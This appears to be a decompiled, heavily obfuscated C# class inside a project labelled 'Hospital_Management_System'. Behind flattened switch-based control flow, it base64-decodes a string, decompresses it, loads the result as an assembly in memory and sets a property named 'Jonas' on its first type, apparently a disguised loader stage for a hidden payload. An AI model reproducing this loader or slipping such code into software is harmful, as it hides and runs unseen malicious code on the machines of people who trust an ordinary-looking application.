using System;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using Microsoft.VisualBasic.CompilerServices;

namespace Hospital_Management_System;

public class SwitchValueState
{
	public SwitchValueState(string s1)
	{
		while (true)
		{
			int num = -830346235;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xCFD7DAF3u) % 4u)
				{
				case 2u:
					num = ((int)num2 * -2078913906) ^ -1523402710;
					continue;
				case 1u:
					CspKeyContainerInfo(s1);
					num = ((int)num2 * -1766841699) ^ -481021922;
					continue;
				default:
					return;
				case 3u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	public byte[] WaitHandle(byte[] B)
	{
		object obj = default(object);
		int num6 = default(int);
		byte[] array2 = default(byte[]);
		object[] array3 = default(object[]);
		bool[] array = default(bool[]);
		byte[] array4 = default(byte[]);
		object obj4 = default(object);
		byte[] result = default(byte[]);
		while (true)
		{
			int num = -328706613;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x994FE122u) % 19u)
				{
				case 17u:
					obj = SwitchValueState.smethod_0(B);
					num = ((int)num2 * -448174763) ^ 0x5EE209CE;
					continue;
				case 16u:
					num6 = SwitchValueState.smethod_9(array2, 0);
					SwitchValueState.smethod_4(obj, (Type)null, "Position", new object[1] { 0 }, (string[])null, (Type[])null);
					num = -1577798801;
					continue;
				case 14u:
					num = ((int)num2 * -1435243559) ^ -1881250850;
					continue;
				case 13u:
					array2 = new byte[4];
					SwitchValueState.smethod_4(obj, (Type)null, "Position", new object[1] { SwitchValueState.smethod_3(SwitchValueState.smethod_2(obj, (Type)null, "Length", new object[0], (string[])null, (Type[])null, (bool[])null), (object)5) }, (string[])null, (Type[])null);
					num = (int)((num2 * 2018171235) ^ 0x55A40891);
					continue;
				case 12u:
				{
					object object_ = obj;
					object[] obj2 = new object[3] { array2, 0, 4 };
					array3 = obj2;
					bool[] obj3 = new bool[3] { true, false, false };
					array = obj3;
					SwitchValueState.smethod_5(object_, (Type)null, "Read", obj2, (string[])null, (Type[])null, obj3, bool_1: true);
					int num4;
					int num5;
					if (array[0])
					{
						num4 = -762092292;
						num5 = -762092292;
					}
					else
					{
						num4 = -958736965;
						num5 = -958736965;
					}
					num = num4 ^ (int)(num2 * 1471241866);
					continue;
				}
				case 11u:
					num = (int)(num2 * 1464700347) ^ -2009108993;
					continue;
				case 10u:
					num = ((int)num2 * -61561377) ^ 0x734C67E8;
					continue;
				case 9u:
					array4 = (byte[])SwitchValueState.smethod_8(SwitchValueState.smethod_6(array3[0]), SwitchValueState.smethod_7(typeof(byte[]).TypeHandle));
					num = -1257919203;
					continue;
				case 8u:
					SwitchValueState.smethod_5(obj4, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, bool_1: true);
					SwitchValueState.smethod_5(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, bool_1: true);
					num = -1657625651;
					continue;
				case 7u:
				{
					int num7;
					int num8;
					if (!array[0])
					{
						num7 = 186495967;
						num8 = 186495967;
					}
					else
					{
						num7 = 1134032013;
						num8 = 1134032013;
					}
					num = num7 ^ ((int)num2 * -628416207);
					continue;
				}
				case 6u:
					num = (int)(num2 * 1004867183) ^ -1256064462;
					continue;
				case 5u:
					obj4 = SwitchValueState.smethod_1((Stream)obj, CompressionMode.Decompress);
					num = (int)((num2 * 464307938) ^ 0xCB056A3);
					continue;
				case 4u:
					result = array4;
					num = (int)((num2 * 1626015402) ^ 0x683D4EA3);
					continue;
				case 3u:
					num6 = (int)SwitchValueState.smethod_8(SwitchValueState.smethod_6(array3[2]), SwitchValueState.smethod_7(typeof(int).TypeHandle));
					num = -1497366153;
					continue;
				case 2u:
				{
					array4 = new byte[checked(num6 - 1 + 1)];
					object object_2 = obj4;
					object[] obj5 = new object[3] { array4, 0, num6 };
					array3 = obj5;
					bool[] obj6 = new bool[3] { true, false, true };
					array = obj6;
					SwitchValueState.smethod_5(object_2, (Type)null, "Read", obj5, (string[])null, (Type[])null, obj6, bool_1: true);
					num = (int)((num2 * 287125095) ^ 0x3647C731);
					continue;
				}
				case 1u:
					array2 = (byte[])SwitchValueState.smethod_8(SwitchValueState.smethod_6(array3[0]), SwitchValueState.smethod_7(typeof(byte[]).TypeHandle));
					num = -598345520;
					continue;
				case 0u:
				{
					int num3;
					if (array[2])
					{
						num = -22445523;
						num3 = -22445523;
					}
					else
					{
						num = -233884061;
						num3 = -233884061;
					}
					continue;
				}
				case 18u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	public object CspKeyContainerInfo(string s1)
	{
		Type type_ = default(Type);
		object result = default(object);
		while (true)
		{
			int num = 2062776809;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x74A48B59u) % 5u)
				{
				case 4u:
					type_ = SwitchValueState.smethod_15(SwitchValueState.smethod_14(SwitchValueState.smethod_10(), WaitHandle(SwitchValueState.smethod_13(SwitchValueState.smethod_11(s1), 0, SwitchValueState.smethod_12(s1)))))[0];
					num = ((int)num2 * -575726633) ^ 0x62F8A937;
					continue;
				case 3u:
					result = 0;
					num = ((int)num2 * -683510075) ^ 0x67722C1D;
					continue;
				case 2u:
				{
					PropertyInfo propertyInfo_ = SwitchValueState.smethod_16(type_, "Jonas");
					SwitchValueState.smethod_17(propertyInfo_, (object)null, (object)new string[3]
					{
						IMethodMessage.xcdasdad,
						IMethodMessage.ccccccccccccccccca,
						"Hospital_Management_System"
					}, (object[])null);
					num = ((int)num2 * -895857832) ^ 0x2F872F1;
					continue;
				}
				case 0u:
					break;
				default:
					return result;
				}
				break;
			}
		}
	}

	static MemoryStream smethod_0(byte[] byte_0)
	{
		return new MemoryStream(byte_0);
	}

	static DeflateStream smethod_1(Stream stream_0, CompressionMode compressionMode_0)
	{
		return new DeflateStream(stream_0, compressionMode_0);
	}

	static object smethod_2(object object_0, Type type_0, string string_0, object[] object_1, string[] string_1, Type[] type_1, bool[] bool_0)
	{
		return NewLateBinding.LateGet(object_0, type_0, string_0, object_1, string_1, type_1, bool_0);
	}

	static object smethod_3(object object_0, object object_1)
	{
		return Operators.SubtractObject(object_0, object_1);
	}

	static void smethod_4(object object_0, Type type_0, string string_0, object[] object_1, string[] string_1, Type[] type_1)
	{
		NewLateBinding.LateSet(object_0, type_0, string_0, object_1, string_1, type_1);
	}

	static object smethod_5(object object_0, Type type_0, string string_0, object[] object_1, string[] string_1, Type[] type_1, bool[] bool_0, bool bool_1)
	{
		return NewLateBinding.LateCall(object_0, type_0, string_0, object_1, string_1, type_1, bool_0, bool_1);
	}

	static object smethod_6(object object_0)
	{
		return RuntimeHelpers.GetObjectValue(object_0);
	}

	static Type smethod_7(RuntimeTypeHandle runtimeTypeHandle_0)
	{
		return Type.GetTypeFromHandle(runtimeTypeHandle_0);
	}

	static object smethod_8(object object_0, Type type_0)
	{
		return Conversions.ChangeType(object_0, type_0);
	}

	static int smethod_9(byte[] byte_0, int int_0)
	{
		return BitConverter.ToInt32(byte_0, int_0);
	}

	static AppDomain smethod_10()
	{
		return Thread.GetDomain();
	}

	static char[] smethod_11(string string_0)
	{
		return string_0.ToCharArray();
	}

	static int smethod_12(string string_0)
	{
		return string_0.Length;
	}

	static byte[] smethod_13(char[] char_0, int int_0, int int_1)
	{
		return Convert.FromBase64CharArray(char_0, int_0, int_1);
	}

	static Assembly smethod_14(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_15(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}

	static PropertyInfo smethod_16(Type type_0, string string_0)
	{
		return type_0.GetProperty(string_0);
	}

	static void smethod_17(PropertyInfo propertyInfo_0, object object_0, object object_1, object[] object_2)
	{
		propertyInfo_0.SetValue(object_0, object_1, object_2);
	}
}
